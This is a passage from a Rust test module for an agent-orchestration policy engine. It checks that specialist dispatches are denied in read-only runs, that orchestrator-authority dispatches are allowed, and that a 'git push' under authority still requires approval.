            Arc::new(NoopAudit),
        )
        .with_intent_auth(auth)
    }

    struct NoopAudit;

    #[async_trait::async_trait]
    impl concerto_core::traits::policy::AuditLog for NoopAudit {
        async fn record(
            &self,
            _entry: concerto_core::traits::policy::AuditEntry,
            _cancel: concerto_core::CancellationToken,
        ) -> Result<(), concerto_core::error::PolicyError> {
            Ok(())
        }
    }

    /// Specialist path (no authority): the coordinator's `call_specialist` in a
    /// read-only-intent run is a final pre-sink Deny through the REAL engine —
    /// the `read_only_denies_call_specialist` behavior, engine-level.
    #[tokio::test]
    async fn engine_denies_non_authority_dispatch_in_read_only_run() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = Arc::new(SessionIntentAuth::new(store));
        auth.set_read_only(true);
        let engine = engine_with_session_auth(auth);

        let input = dispatch_input();
        let dispatch = action("call_specialist", &input);
        let verdict = engine.evaluate(&dispatch, concerto_core::CancellationToken::new()).await;
        assert_eq!(
            verdict.expect("evaluate"),
            concerto_core::types::PolicyVerdict::Deny,
            "non-authority dispatch in a read-only run stays denied"
        );
    }

    /// Orchestrator path (authority): the SAME `call_specialist` action with
    /// `orchestrator_authority` is allowed through the same engine, despite the
    /// read-only-intent auth that denies the specialist path.
    #[tokio::test]
    async fn engine_allows_authority_dispatch_in_read_only_run() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = Arc::new(SessionIntentAuth::new(store));
        auth.set_read_only(true);
        let engine = engine_with_session_auth(auth);

        let input = dispatch_input();
        let dispatch =
            PolicyAction { orchestrator_authority: true, ..action("call_specialist", &input) };
        let verdict = engine.evaluate(&dispatch, concerto_core::CancellationToken::new()).await;
        assert_eq!(
            verdict.expect("evaluate"),
            concerto_core::types::PolicyVerdict::Allow,
            "the coordinator's own authority dispatch is allowed"
        );
    }

    /// Authority does NOT widen a Consequential action: a `git push` under
    /// authority keeps the approval path (never auto-allowed), so the deny-class
    /// + sink invariants survive the authority branch.
    #[tokio::test]
    async fn engine_authority_keeps_consequential_dispatch_under_approval() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = Arc::new(SessionIntentAuth::new(store));
        auth.set_read_only(true);
        let engine = engine_with_session_auth(auth);

        let push_input = serde_json::json!({ "operation": "push" });
        let push = PolicyAction { orchestrator_authority: true, ..action("git", &push_input) };
        let verdict = engine.evaluate(&push, concerto_core::CancellationToken::new()).await;
        assert!(
            matches!(
                verdict.expect("evaluate"),
                concerto_core::types::PolicyVerdict::RequireApproval { .. }
            ),
            "a Consequential action keeps the approval path even under authority"
        );
    }
}
